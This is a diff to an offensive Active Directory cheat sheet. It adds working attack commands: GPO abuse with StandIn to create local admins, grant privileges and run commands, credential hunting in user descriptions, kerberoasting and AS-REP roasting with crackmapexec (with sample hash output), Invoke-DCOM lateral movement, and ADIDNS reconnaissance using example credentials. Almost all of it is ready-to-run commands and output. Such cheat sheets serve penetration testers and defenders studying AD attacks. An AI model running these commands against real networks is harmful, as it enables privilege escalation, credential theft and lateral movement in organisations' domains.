@@ -21,6 +21,7 @@
       - [Abuse GPO with PowerGPOAbuse](#abuse-gpo-with-powergpoabuse)
       - [Abuse GPO with pyGPOAbuse](#abuse-gpo-with-pygpoabuse)
       - [Abuse GPO with PowerView](#abuse-gpo-with-powerview)
+      - [Abuse GPO with StandIn](#abuse-gpo-with-standin)
     - [Dumping AD Domain Credentials](#dumping-ad-domain-credentials)
       - [Using ndtsutil](#using-ndtsutil)
       - [Using Vshadow](#using-vshadow)
@@ -35,6 +36,7 @@
       - [Kerberos pre-auth bruteforcing](#kerberos-pre-auth-bruteforcing)
       - [Spray a pre-generated passwords list](#spray-a-pre-generated-passwords-list)
       - [Spray passwords against the RDP service](#spray-passwords-against-the-rdp-service)
+      - [BadPwdCount attribute](#badpwdcount-attribute)
     - [Password in AD User comment](#password-in-ad-user-comment)
     - [Reading LAPS Password](#reading-laps-password)
     - [Reading GMSA Password](#reading-gmsa-password)
@@ -83,6 +85,7 @@
     - [PrivExchange attack](#privexchange-attack)
     - [PXE Boot image attack](#pxe-boot-image-attack)
     - [DSRM Credentials](#dsrm-credentials)
+    - [DNS Reconnaissance](#dns-reconnaissance)
     - [Impersonating Office 365 Users on Azure AD Connect](#impersonating-office-365-users-on-azure-ad-connect)
   - [Linux Active Directory](#linux-active-directory)
     - [CCACHE ticket reuse from /tmp](#ccache-ticket-reuse-from-tmp)
@@ -755,8 +758,6 @@ PS> Add-ComputerScript/Add-UserScript -ScriptName 'EvilScript' -ScriptContent $(
 PS> Add-UserTask/Add-ComputerTask -TaskName 'eviltask' -Command 'powershell.exe /c' -CommandArguments "'$(Get-Content evil.ps1)'" -Author Administrator
 ```
 
-
-
 #### Abuse GPO with pyGPOAbuse
 
 ```powershell
@@ -784,6 +785,18 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
 New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
 ```
 
+#### Abuse GPO with StandIn
+
+```powershell
+# Add a local administrator
+StandIn.exe --gpo --filter Shards --localadmin user002
+
+# Set custom right to a user
+StandIn.exe --gpo --filter Shards --setuserrights user002 --grant "SeDebugPrivilege,SeLoadDriverPrivilege"
+
+# Execute a custom command
+StandIn.exe --gpo --filter Shards --tasktype computer --taskname Liber --author "REDHOOK\Administrator" --command "C:\I\do\the\thing.exe" --args "with args"
+```
 
 ### Dumping AD Domain Credentials
 
@@ -1024,15 +1037,34 @@ hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.1
 ncrack –connection-limit 1 -vv --user administrator -P password-file.txt rdp://10.10.10.10
 ```
 
+#### BadPwdCount attribute
+
+> The number of times the user tried to log on to the account using an incorrect password. A value of 0 indicates that the value is unknown.
+
+```powershell
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --users
+LDAP        10.0.2.11       389    dc01       Guest      badpwdcount: 0 pwdLastSet: <never>
+LDAP        10.0.2.11       389    dc01       krbtgt     badpwdcount: 0 pwdLastSet: <never>
+```
+
+
 ### Password in AD User comment
 
 ```powershell
+$ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users
+GET-DESC... 10.0.2.11       389    dc01    [+] Found following users: 
+GET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain
+GET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account
+```
+
+There are 3-4 fields that seem to be common in most AD schemas: UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
+
+```powershell
 enum4linux | grep -i desc
-There are 3-4 fields that seem to be common in most AD schemas: 
-UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
 
 Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
 ```
+
 or dump the Active Directory and `grep` the content.
 
 ```powershell
@@ -1261,7 +1293,9 @@ Any valid domain user can request a kerberos ticket (TGS) for any domain service
 
 * CrackMapExec Module
   ```powershell
-  crackmapexec ldap 10.10.10.100 -u 'username' -p 'password' --kerberoasting output.txt
+  $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --kerberoast output.txt
+  LDAP        10.0.2.11       389    dc01           [*] Windows 10.0 Build 17763 x64 (name:dc01) (domain:lab.local) (signing:True) (SMBv1:False)
+  LDAP        10.0.2.11       389    dc01           $krb5tgs$23$*john.doe$lab.local$MSSQLSvc/dc01.lab.local~1433*$efea32[...]49a5e82$b28fc61[...]f800f6dcd259ea1fca8f9
   ```
 
 * [Rubeus](https://github.com/GhostPack/Rubeus)
@@ -1346,7 +1380,8 @@ Mitigations:
 
 * CrackMapExec Module
   ```powershell
-  crackmapexec ldap 10.10.10.100 -u 'username' -p 'password' --asreproast output.txt
+  $ crackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 --asreproast output.txt
+  LDAP        10.0.2.11       389    dc01           $krb5asrep$23$john.doe@LAB.LOCAL:5d1f750[...]2a6270d7$096fc87726c64e545acd4687faf780[...]13ea567d5
   ```
 
 Using `hashcat` or `john` to crack the ticket.
@@ -1833,6 +1868,7 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
 * CheeseTools - https://github.com/klezVirus/CheeseTools
   ```powershell
+  # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
   -t, --target=VALUE         Target Machine
   -b, --binary=VALUE         Binary: powershell.exe
   -a, --args=VALUE           Arguments: -enc <blah>
@@ -1845,8 +1881,15 @@ Set-DomainUserPassword -Identity 'TargetUser' -AccountPassword $NewPassword
 
   Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro.
   ```
-
-  https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/
+* Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1
+  ```powershell
+  Import-Module .\Invoke-DCOM.ps1
+  Invoke-DCOM -ComputerName '10.10.10.10' -Method MMC20.Application -Command "calc.exe"
+  Invoke-DCOM -ComputerName '10.10.10.10' -Method ExcelDDE -Command "calc.exe"
+  Invoke-DCOM -ComputerName '10.10.10.10' -Method ServiceStart "MyService"
+  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellBrowserWindow -Command "calc.exe"
+  Invoke-DCOM -ComputerName '10.10.10.10' -Method ShellWindows -Command "calc.exe"
+  ```
 
 
 #### DCOM via MMC Application Class 
@@ -2423,6 +2466,17 @@ PXE allows a workstation to boot from the network by retrieving an operating sys
     >>>> >>>> UserID = MdtService
     >>>> >>>> UserPassword = Somepass1
     ```
+
+### DNS Reconnaissance
+
+Perform ADIDNS searches
+
+```powershell
+StandIn.exe --dns --limit 20
+StandIn.exe --dns --filter SQL --limit 10
+StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e
+```
 
 ### DSRM Credentials
 
